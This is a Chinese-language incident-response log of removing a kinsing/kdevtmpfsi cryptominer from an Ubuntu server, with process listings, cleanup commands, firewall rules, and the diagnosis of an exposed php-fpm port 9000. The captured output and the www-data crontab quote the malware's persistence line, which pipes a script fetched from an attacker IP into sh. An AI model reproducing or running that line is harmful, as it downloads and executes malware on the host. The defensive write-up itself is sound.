top 查看 CPU 占用很高的进程，可疑的有 kdevtmpfsi, kinsing，运行用户都是 www-data

        127 root      20   0       0      0      0 R  82.1   0.0 524:23.45 kswapd0
     459817 root      20   0  100376   6864    468 D   7.2   0.7   0:05.14 snapd
     436327 root      20   0  997428  11880      0 S   2.8   1.2   9:01.79 YDService
     446827 www-data  20   0  515548 265088      0 D   1.9  26.4  53:16.30 kdevtmpfsi
     458366 mysql     20   0 1295820 342204      0 S   1.3  34.1   0:12.21 mysqld
     436360 root      20   0  632428   5632   3660 D   0.9   0.6   1:18.45 YDEdr
     189330 root      20   0 1230712   1980      0 S   0.6   0.2   3:55.27 YDLive
     446543 www-data  20   0  718224  12304      0 S   0.6   1.2   0:10.64 kinsing
     459159 www-data  20   0  718224  33376      0 S   0.6   3.3   0:04.09 kinsing

查看可疑进程是否是一个服务，看到是挂在 cron 服务下的

    # systemctl status 446827
    ● cron.service - Regular background program processing daemon
         Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
         Active: active (running) since Sat 2021-03-27 10:34:45 CST; 1 day 22h ago
           Docs: man:cron(8)
       Main PID: 890 (cron)
          Tasks: 21 (limit: 1066)
         Memory: 309.5M
         CGroup: /system.slice/cron.service
                 ├─   890 /usr/sbin/cron -f
                 ├─390410 /usr/local/qcloud/stargate/bin/sgagent -d
                 ├─446543 /tmp/kinsing
                 ├─446827 /tmp/kdevtmpfsi
                 ├─456416 /usr/sbin/CRON -f
                 ├─456417 /bin/sh -c wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
                 ├─456421 sh
                 └─459159 /tmp/kinsing


查看所有的 www-data 进程

    # ps -ef | grep www-data
    www-data   40957   40944  0 Mar27 ?        00:00:00 php-fpm: pool www
    www-data   40958   40944  0 Mar27 ?        00:00:00 php-fpm: pool www
    www-data   44049   40944  0 Mar27 ?        00:00:00 php-fpm: pool www
    www-data  446543       1  0 07:16 ?        00:00:11 /tmp/kinsing
    www-data  446827       1 54 07:17 ?        00:53:18 /tmp/kdevtmpfsi
    www-data  456417  456416  0 08:14 ?        00:00:00 /bin/sh -c wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
    www-data  456421  456417  0 08:14 ?        00:00:00 sh
    www-data  459159  456421  0 08:37 ?        00:00:04 /tmp/kinsing
    root      460015  459861  0 08:54 pts/0    00:00:00 grep --color=auto www-data

停止 crontab ，杀掉可疑进程，删除可疑文件

    systemctl stop cron.service
    kill -9 446543 446827 456417 456421 459159
    rm -f /tmp/kinsing /tmp/kdevtmpfsi

启用防火墙，只保留22 80 443，禁用出站 IP 195.3.146.118

    ufw enable
    ufw allow 22
    ufw allow 80
    ufw allow 443
    ufw deny to 195.3.146.118
    ufw status numbered

确认 /etc 目录下没有执行远程脚本的配置

    find  /etc/ -type f | xargs grep curl

开启一个自动杀病毒进程的定时任务

    # vim kill_kdevtmpfsi.sh    

        ps -aux | grep kinsing |grep -v grep|cut -c 9-15 | xargs kill -9 
        ps -aux | grep kdevtmpfsi |grep -v grep|cut -c 9-15 | xargs kill -9 
        rm -f /var/tmp/kinsing
        rm -f /tmp/kdevtmpfsi

    # crontab -l

        * * * * * /home/ubuntu/scripts/kill_kdevtmpfsi.sh
    # systemctl stop cron.service

排查 crontab 确保没有可疑的定时任务, 删掉 www-data的crontab


    # cd /var/spool/cron/
    # ls -l crontabs/
    total 8
    -rw------- 1 root     crontab 358 Mar 29 09:29 root
    -rw------- 1 www-data crontab 248 Mar 29 08:36 www-data
    # cat crontabs/www-data
    * * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1

排查可疑服务

    systemctl list-units --all --type=service

全局搜索可疑日志

    find / -name "*kdevtmpfsi*"

排查 ssh 和 nginx 日志

    grep Accepted /var/log/auth.log
    more /var/log/nginx/access.log

确认没有可疑的网络连接，发现 php-fpm 监听了9000外网端口，怀疑这就是本次中木马的原因

    netstat -lntupaa


PHP-FPM Fastcgi 未授权访问漏洞（端口9000）
https://blog.csdn.net/u012206617/article/details/109165947

修改配置只监听 localhost:9000

    sudo vi /etc/php/7.4/fpm/pool.d/www.conf
    systemctl restart php7.4-fpm


